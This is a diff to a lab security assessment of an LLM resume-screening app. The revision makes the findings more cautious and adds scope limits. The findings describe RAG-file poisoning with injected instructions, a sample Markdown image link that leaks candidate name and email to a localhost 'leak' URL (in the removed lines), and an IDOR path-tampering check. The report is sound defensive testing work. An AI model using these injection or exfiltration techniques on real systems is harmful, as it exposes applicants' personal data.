@@ -7,7 +7,7 @@
 ---
 
 ## Executive Summary
-The EcoMada ATS utilizes an LLM to automatically analyze resumes and send emails. The assessment revealed a critical exploit chain. An unauthenticated attacker can bypass the application's keyword filter, manipulate the AI via a poisoned knowledge base (RAG), and force the AI to exfiltrate sensitive data (including API secrets and the global storage directory link) via email and Markdown image rendering. Furthermore, the application suffers from Insecure Direct Object Reference (IDOR), allowing the download of other candidates' files.
+The EcoMada ATS is a local educational application that analyzes uploaded resumes with an LLM. The source-code review identified weak keyword-based input filtering and unsafe rendering of model-generated Markdown. The lab also explored risks arising from untrusted content in the model context and from a separate local file-serving setup. The sample email function writes message content to a local log; it does not send email through an external mail service. The findings below distinguish behavior visible in the application source from scenarios that depend on additional lab configuration.
 
 ---
 
@@ -23,21 +23,29 @@ The EcoMada ATS utilizes an LLM to automatically analyze resumes and send emails
 ## Finding 2: RAG Data Poisoning & Indirect Prompt Injection
 - **Severity:** Critical
 - **OWASP Mapping:** LLM03 (Data Poisoning), LLM01 (Prompt Injection)
-- **Description:** The application reads its business rules from a local file (`regles_rh.txt`). This file is not protected against unauthorized modifications.
-- **Exploit:** The attacker modified the `regles_rh.txt` file to inject a malicious rule. The rule instructed the AI to decode a Base64 string and execute the action contained within it. The AI blindly trusted the poisoned rule, decoded the payload, and altered its normal behavior.
+- **Description:** The application reads business rules from a local file (`regles_rh.txt`) and inserts that text directly into the system prompt. The application code shown does not expose an upload or remote write function for this file; modification of the file therefore requires access to the local lab filesystem or another separately demonstrated write path.
+- **Exploit:** In the controlled lab, the local rules file was modified to contain adversarial instructions. The model treated this text as trusted business context and changed its response. This demonstrates a prompt-trust weakness when local context is tampered with; it does not, by itself, demonstrate that a remote unauthenticated user can modify the file.
 - **Remediation:** The RAG knowledge base must be strictly read-only and protected by strong access controls. The AI should be instructed to never execute operational commands (like sending emails) based solely on text from a knowledge base.
 
 ## Finding 3: Zero-Click Data Exfiltration via Markdown
 - **Severity:** Critical
 - **OWASP Mapping:** LLM02 (Sensitive Information Disclosure)
-- **Description:** The frontend renders the LLM's output as standard Markdown without sanitizing URLs.
-- **Exploit:** The attacker injected a payload forcing the AI to generate a Markdown image link pointing to an external server, dynamically inserting the candidate's PII (`![Audit](http://localhost:8000/leak?nom=Dupont&email=test@att.com)`).
-- **Impact:** An attacker can exfiltrate sensitive data (PII, API keys) silently. The moment the HR manager views the AI's analysis, the browser automatically sends the data to the attacker's server.
+- **Description:** The frontend passes the LLM response to `st.markdown` without an application-level allowlist for generated links or image references.
+- **Exploit:** In the lab scenario, adversarial CV content influenced the model to produce a Markdown image reference containing candidate data. Rendering such a reference can cause the viewing browser to request the referenced URL. The demonstrated example used a localhost address; this is a proof-of-concept of unsafe rendering, not proof that data was transmitted to an internet-hosted attacker.
+- **Impact:** Depending on the generated URL and the browser's network context, rendering an attacker-controlled image reference could disclose data embedded in that URL through an outbound request. The current evidence does not establish exfiltration of API keys or transmission to an external attacker-controlled server.
 - **Remediation:** Sanitize the LLM output before rendering. Implement a Content Security Policy (CSP) that blocks image loading from unauthorized domains.
 
 ## Finding 4: Insecure Direct Object Reference (IDOR)
 - **Severity:** Critical
 - **OWASP Mapping:** API1:2023 (Broken Object Level Authorization)
-- **Description:** The storage server hosting the resumes (`localhost:8000/candidatures/`) does not verify user authentication or authorization.
-- **Exploit:** An attacker can modify the URL path (e.g., changing `candidatures/John_Doe/` to `candidatures/Jane_Smith/`) to access and download resumes belonging to other candidates.
+- **Description:** The application stores resumes under folders derived from submitted name fields. The accompanying lab used a separate local file-serving process for downloads; authorization behavior belongs to that file server and is not implemented in the Streamlit source shown here.
+- **Exploit:** In the configured lab file-serving setup, changing a candidate folder path was used to test whether another candidate's file could be retrieved. This should be treated as a lab-specific broken-access-control finding and retested against the exact file-server configuration before generalizing it.
 - **Remediation:** Implement strict Access Control Lists (ACL). Files must only be accessible via secure, temporary signed URLs generated by an authenticated backend.
+
+
+## Scope and Evidence Limitations
+- Testing was performed against a local educational application and supporting lab services.
+- The application source confirms that the email helper appends content to `emails_envoyes.log`; it does not perform SMTP delivery.
+- The local HR rules file is not remotely writable through the shown Streamlit interface.
+- The Markdown proof of concept uses a localhost URL. External data exfiltration was not established by that example alone.
+- The file-download authorization test depends on a separate file-serving process; its configuration should be included with the evidence for a reproducible finding.
